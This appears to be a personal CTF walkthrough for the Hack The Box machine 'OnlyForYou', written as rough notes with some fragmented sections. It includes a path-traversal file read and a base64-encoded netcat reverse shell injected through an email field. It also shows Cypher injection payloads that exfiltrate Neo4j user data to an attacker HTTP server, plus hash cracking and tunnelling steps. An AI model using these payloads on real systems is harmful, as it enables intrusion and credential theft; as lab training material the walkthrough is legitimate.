# Only For  You usrer8788 Notes

Pre-Req
> Connect to the Seasonal VPN
> IP = 10.129.70.214                                                                              
┌──(toor㉿kali)-[~/OnlyForYou]
└─$ sudo openvpn ~/Downloads/competitive_DefenceLogic.ovpn 


## Enumeration Phase

### Nmap Scan 

NmaFrom our nmap scan we can see a webpage
_http-title: Did not follow redirect to http://only4you.htb/


Add this to the /etc/hosts file
> 10.129.70.214 only4you.htb

Viewing the Services page, we find an inactive subdomain
https://beta.only4you.htb/
    add this to our /etc/hosts and see what we get...
> 10.129.70.214 only4you.htb beta.only4you.htb 

### Subdomain enum

http://beta.only4you.htb/ gives us a link to download their source code 
[BurpSuite??]http://beta.only4you.htb/resize gives us the ability to **upload images**
[BurpSuite??]http://beta.only4you.htb/convert gives us the ability to **upload images**

### Source Code Enum

> Looking at the source code, we can see that the download function of app.py is vulnerable
'''
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
> Path traversal workaround needed
  **if '..' in filename or filename.startswith('../'):**
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
'''
> Since this application uses flask, there is a vuln that allows us to look for any file as long as we know the full path.



### BurpSuite 

#### LFI Manual part 1 
1. Go to /resize and upload an image
2. Open BurpSuite and turn on FoxyProxy (Burp)
3. Set Intercept to On
4. Once we are on the /list page, download any file.
5. Capture the request and send to repeater  (Ctrl + R)
6. Change the *image* to /etc/passwd

'''
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
**neo4j:x:997:997::/var/lib/neo4j:/bin/bash**
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
'''



#### LFI via ffuf manual (Without Burp Pro)
> We are looking for an nginx config file as seclists did not give us much
> The things we need are as followed
[x] a config file ( we have that nginx )
[] Default creds 
[] A user that would take those default creds 


Using ChatGPT, create a simple payload list for the defualt nginx files:
Q: give it in a .txt code block so I can copy it into a wordlist for fuzzing aswell as the full path. Also ndo not include your notes after the file

A: 
'''
/etc/nginx/nginx.conf
/etc/nginx/fastcgi_params
/etc/nginx/mime.types
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/nginx/proxy_params
/etc/nginx/ssl_params
/etc/nginx/uwsgi_params
/etc/nginx/scgi_params
/etc/nginx/koi-utf
'''

Use the intruder and sniper with that payload to perform the attack
Once the attack is finsihed, look through you results.

Looking at the sites-available, we have found the root location of the web application:
'''
	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
'''

Now that we have the root folder for the web application, we can now grab the app.py file with the repeater tab we used earlier.

## Inital Reverse Shell

email=test@google.com;echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjI1IDkwMDEgPi90bXAvZg==|base64%20-d|bash&subject=ss&message=ss



### Chisel
> neo4j default part 1
> neo4j default password

> Looking for open ports (netstat -anot)
    > only4you web login on port 8001
        > Add another chisel connection
> Attack Box
└─$ ./chisel server -p 9999 --reverse

Content-Length: 168




┌──(toor㉿kali)-[~/OnlyForYou]
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.129.70.214] 35562
sh: 0: can't access tty; job control turned off
$ 
$ 
$ whoami
www-data
$ 

Now that we have access, we will need to go back to the etc./passwd file to notice the user neo4j is of interest

**neo4j:x:997:997::/var/lib/neo4j:/bin/bash**

> neo4j  | HTTP | 7474 |  server.http.listen_address
>        | Bolt | 7687 |  server.bolt.listen.address

TArget Box 

www-data@only4you:~/only4you.htb/tmp$ chisel server 10.10.14.25:9999 R:7687:0.0.0.0:7687 R:7474:127.0.0.1:7474  



### Add another shell after chisel
> revshells python3 #2
    >https://www.revshells.com/
'''


### Only4You
> First we will try the default admin creds known by everyone 
    > admin:admin
> Success!!!


Looking around this webpage, we can see the following
> Dashboard
> Employees
- Clicking the search feature reveals employees of only4you
- since we saw neo4j earlier, we will look for neo4j exploits on hacktricks
    - Specifically we are looking for cipher injection
'''
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://<AttBoxIP>:<PORT>/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
'''
> Before executing the command, set up a http server
>  python -m http.server 8006 
**Cipher Injection Success**
> Original HackTricks 
' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.34:8006/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
> Altered Request we need the user properties
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.34:8006/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

Response on our server (excerpt)
'''
┌──(toor㉿kali)-[~/OnlyForYou]
└─$ python3 -m http.server 8006
Serving HTTP on 0.0.0.0 port 8006 (http://0.0.0.0:8006/) ...
10.129.73.82 - - [26/Apr/2023 13:39:48] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?username=admin HTTP/1.1" 200 -
10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?username=john HTTP/1.1" 200 -
'''

Based on the log entries you earlier, the hashes are the strings that come after the password= parameter in each of the GET requests:
'''
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
'''
These are SHA-256 hashes in hexadecimal format, each represented by a string of 64 characters.


Next we will use a hash cracking tool and the certified classic hashcat

Since we already know the admin credentials (admin:admin), we will focus on the user john

hashcat command
<hashcat -m 1400 a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 /usr/share/wordlists/rockyou.txt>

'''
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4...1c55f6
Time.Started.....: Wed Apr 26 13:59:08 2023 (9 secs)
Time.Estimated...: Wed Apr 26 13:59:17 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1163.0 kH/s (0.49ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 35%

Started: Wed Apr 26 13:58:30 2023
Stopped: Wed Apr 26 13:59:17 2023
'''                                    
<ssh john@only4you.htb>

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40
john@only4you:~$ ls
user.txt
john@only4you:~$ cat user.txt
cad7575c74944bfa02260a1916dc8e2c
john@only4you:~$ 


## Root section
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz

### Pip download exploit


git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi





